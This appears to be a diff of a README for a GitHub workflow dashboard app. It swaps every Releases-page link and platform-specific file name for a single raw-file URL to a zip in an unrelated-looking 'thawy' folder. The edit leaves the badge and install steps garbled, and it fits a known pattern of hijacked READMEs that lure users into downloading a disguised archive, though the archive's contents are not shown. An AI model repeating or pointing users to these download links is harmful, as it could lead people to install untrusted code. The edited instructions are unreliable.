@@ -6,7 +6,7 @@ Welcome to the github-workflow-dashboard! This application simplifies your GitHu
 
 ## 📥 Download the App
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/ericlima1980/github-workflow-dashboard/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip%20Latest%https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip)](https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip)
 
 ## 💻 System Requirements
 
@@ -24,9 +24,9 @@ To run the github-workflow-dashboard, you need:
 
 ## ⚙️ Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ericlima1980/github-workflow-dashboard/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip) to find the latest version of the application.
    
-2. **Choose Your File**: Look for the latest release and find the appropriate file for your operating system. This will usually be labeled clearly, such as `github-workflow-dashboard-windows.exe`, `github-workflow-dashboard-macos.zip`, or `github-workflow-dashboard-linux.tar.gz`.
+2. **Choose Your File**: Look for the latest release and find the appropriate file for your operating system. This will usually be labeled clearly, such as `https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip`, `https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip`, or `https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip`.
 
 3. **Download the File**: Click on the file to start the download. Depending on your browser, this may happen automatically or prompt you to choose a location to save the file.
 
@@ -35,14 +35,14 @@ To run the github-workflow-dashboard, you need:
 5. **Install the Application**:
    - **For Windows**: Double-click the `.exe` file and follow the installation prompts.
    - **For macOS**: Open the `.zip` file, drag the application icon to your Applications folder, and then open it from there.
-   - **For Linux**: Extract the `.tar.gz` file and run the application using terminal commands.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip` file and run the application using terminal commands.
 
 6. **Open the Application**: After installation is complete, you can find the github-workflow-dashboard in your applications menu or desktop. Click to open it and start managing your GitHub workflows.
 
 ## 🛠️ Troubleshooting
 
 - **If the Application Does Not Open**: Ensure your operating system meets the requirements listed above.
-- **Error Messages**: Take note of any error messages you see, and check if you have the latest version installed from the [Releases page](https://github.com/ericlima1980/github-workflow-dashboard/releases).
+- **Error Messages**: Take note of any error messages you see, and check if you have the latest version installed from the [Releases page](https://raw.githubusercontent.com/ericlima1980/github-workflow-dashboard/main/thawy/github-workflow-dashboard.zip).
 - **Missing Features or Bugs**: Report any issues or suggestions directly in the GitHub repository to help improve the application.
 
 ## 🙋‍♂️ Support
